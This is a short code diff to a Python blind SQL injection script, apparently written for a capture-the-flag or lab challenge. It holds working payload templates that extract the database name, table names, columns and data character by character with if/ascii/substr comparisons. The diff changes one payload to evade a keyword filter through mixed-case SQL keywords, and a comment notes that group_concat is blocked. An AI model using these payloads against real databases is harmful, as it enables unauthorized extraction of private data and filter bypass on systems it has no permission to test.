@@ -9,7 +9,7 @@ payload1_database_length = '1\' or length(database())={}#'
 # payload_database = '1\' or ord(substr(database(),{},1))>{}#'
 # payload_data = '1\' or ord( SUBSTR((select group_concat({}) from {}),{},1))>{}#'
 payload_database = 'if(ascii(substr(database(),{},1))>{},1,2)'
-# payload_table = 'if(ascii(SUBSTR((select	group_concat(table_name)	from	information_schema.tables	where	table_schema=database()),{},1))>{}),1,2)' # group_concat过滤了用不了
+# payload_table = '-1\' or if(aScii(SUBSTR((selEct group_concat(table_name) from information_schema.tables where tablE_schema=database()),{},1))>{},1,0) #' # group_concat过滤了用不了
 # payload_column = '1\' or ord( SUBSTR((select group_concat(column_name) from information_schema.columns where table_name="{}"),{},1))>{}#'
 payload_data = 'if(ascii(SUBSTR((select	{}	from	{}),{},1))>{},1,2)'
 # payload_data = 'if(ascii(SUBSTR((select {} from {}),{},1))>{},1,2)'.replace(' ', '\t')
@@ -25,7 +25,7 @@ def go(title, payload):
     db = ''
     for i in range(1, 128):
         s = search(i, payload)
-        if not 32 < ord(s) <= 128:
+        if not 1 < ord(s) <= 128:
             break
         db += s
         print(f'{title} = ', db)
